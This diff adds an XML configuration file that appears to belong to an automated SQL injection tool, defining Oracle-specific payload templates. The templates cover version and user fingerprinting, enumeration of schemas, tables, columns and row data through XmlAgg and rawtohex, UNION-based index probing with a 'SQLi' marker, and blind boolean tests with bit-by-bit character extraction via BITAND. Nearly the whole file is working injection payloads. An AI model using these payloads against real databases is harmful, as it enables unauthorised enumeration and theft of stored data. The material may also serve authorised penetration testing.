@@ -1,0 +1,219 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<model>
+    <vendor></vendor>
+    <resource>
+        <info>
+SELECT version
+    || '${ENCLOSE_VALUE_SQL}' 
+    || SYS.DATABASE_NAME 
+    || '${ENCLOSE_VALUE_SQL}' 
+    || user 
+    || '${TRAIL_SQL}'
+FROM v%24instance
+        </info>
+        <schema>
+            <database><![CDATA[
+select
+    utl_raw.cast_to_varchar2(
+        CAST(
+            DBMS_LOB.SUBSTR(
+                replace(
+                    replace(
+                        XmlAgg(
+                            XmlElement(
+                                "a",
+                                rawtohex(
+                                    '${ENCLOSE_VALUE_SQL}'
+                                    || s
+                                    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                )
+                            ) order by s nulls last
+                        ).getClobVal(),
+                        '<a>',''
+                    ),
+                    '<%2Fa>',
+                    rawtohex('${SEPARATOR_CELL_SQL}')
+                ) || rawtohex('${TRAIL_SQL}'),
+                4000,
+                1
+            ) AS VARCHAR(1024)
+        )
+    )
+from(
+    select t.s 
+    from
+        (SELECT DISTINCT owner s FROM all_tables) t,
+        (SELECT DISTINCT owner s FROM all_tables) t1
+    where t.s >= t1.s
+    group by t.s
+    {limit}
+)
+            ]]></database>
+            <table><![CDATA[
+select
+    utl_raw.cast_to_varchar2(
+        CAST(
+            DBMS_LOB.SUBSTR(
+                replace(
+                    replace(
+                        XmlAgg(
+                            XmlElement(
+                                "a",
+                                rawtohex(
+                                    '${ENCLOSE_VALUE_SQL}'
+                                    || s
+                                    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                )
+                            ) order by s nulls last
+                        ).getClobVal(),
+                        '<a>',
+                        ''
+                    ),
+                    '<%2Fa>',
+                    rawtohex('${SEPARATOR_CELL_SQL}')
+                ) || rawtohex('${TRAIL_SQL}'),
+                4000,
+                1
+            ) AS VARCHAR(1024)
+        )
+    )
+from (
+    select t.s 
+    from 
+        (SELECT DISTINCT table_name s FROM all_tables where owner='${DATABASE}')t,
+        (SELECT DISTINCT table_name s FROM all_tables where owner='${DATABASE}')t1
+    where t.s >= t1.s
+    group by t.s
+    {limit}
+)
+            ]]></table>
+            <column><![CDATA[
+select
+    utl_raw.cast_to_varchar2(
+        CAST(
+            DBMS_LOB.SUBSTR(
+                replace(
+                    replace(
+                        XmlAgg(
+                            XmlElement(
+                                "a",
+                                rawtohex(
+                                    '${ENCLOSE_VALUE_SQL}'
+                                    || s
+                                    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                )
+                            ) order by s nulls last
+                        ).getClobVal(),
+                        '<a>',
+                        ''
+                    ),
+                    '<%2Fa>',
+                    rawtohex('${SEPARATOR_CELL_SQL}')
+                ) || rawtohex('${TRAIL_SQL}'),
+                4000,
+                1
+            ) AS VARCHAR(1024)
+        )
+    )
+from (
+    select t.s 
+    from
+        (SELECT DISTINCT column_name s FROM all_tab_columns where owner='${DATABASE}'and table_name='${TABLE}')t,
+        (SELECT DISTINCT column_name s FROM all_tab_columns where owner='${DATABASE}'and table_name='${TABLE}')t1
+    where t.s >= t1.s
+    group by t.s
+    {limit}
+)
+            ]]></column>
+            <row>
+                <query><![CDATA[
+select
+    utl_raw.cast_to_varchar2(
+        CAST(
+            DBMS_LOB.SUBSTR(
+                replace(
+                    replace(
+                        XmlAgg(
+                            XmlElement(
+                                "a",
+                                rawtohex(
+                                    '${ENCLOSE_VALUE_SQL}'
+                                    || s
+                                    || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                )
+                            ) order by s nulls last
+                        ).getClobVal(),
+                        '<a>',
+                        ''
+                    ),
+                    '<%2Fa>',
+                    rawtohex('${SEPARATOR_CELL_SQL}')
+                )||rawtohex('${TRAIL_SQL}'),
+                4000,
+                1
+            ) AS VARCHAR(1024)
+        )
+    )
+from (
+    select t.s 
+    from 
+        (SELECT DISTINCT ${FIELDS} s FROM ${DATABASE}.${TABLE})t,
+        (SELECT DISTINCT ${FIELDS} s FROM ${DATABASE}.${TABLE})t1 
+    where t.s >= t1.s
+    group by t.s
+    {limit}
+)
+                ]]></query>
+                <fields>
+                <field>trim(to_char(${FIELD}))</field>
+                <concat>||'%7f'||</concat>
+                </fields>
+            </row>
+        </schema>
+    </resource>
+    <strategy>
+        <configuration>
+            <slidingWindow>
+(
+    select
+        'SQLi'||
+        substr(
+            (${INJECTION}),
+            ${INDEX},
+            ${CAPACITY}
+        )from dual
+)
+            </slidingWindow>
+            <limit> having count(*)between ${LIMIT} and 65536</limit>
+            <failsafe>to_char(1337${INDICE}7330%2b1)</failsafe>
+            <calibrator>rpad('%23',1024,'%23')s</calibrator>
+            <capacity>3996</capacity>
+            <limitBoundary>1</limitBoundary>
+        </configuration>
+        <normal>
+            <indices> union select ${INDICES} from dual</indices>
+            <capacity>(SELECT 'SQLi'||${INDICE}||${CALIBRATOR} FROM dual)</capacity>
+            <orderBy> order by 1337</orderBy>
+        </normal>
+        <boolean>
+            <test>
+                <false>1=0</false>
+                <false>'a'%21='a'</false>
+                <false>'b'%21='b'</false>
+                <false>1=2</false>
+                <false>1%21=1</false>
+                <false>2%21=2</false>
+                <true>0=0</true>
+                <true>'a'%21='b'</true>
+                <true>'a'='a'</true>
+                <true>1=1</true>
+                <true>2=2</true>
+                <true>1%21=2</true>
+                <initialization>0%2b1=1</initialization>
+                <bit>0!=BITAND(ascii(substr(${INJECTION},${INDEX},1)),${BIT})</bit>
+                <length>length(${INJECTION})>${INDEX}</length>
+            </test>
+            <blind> and ${TEST}</blind>
+        </boolean>
+    </strategy>
+</model>
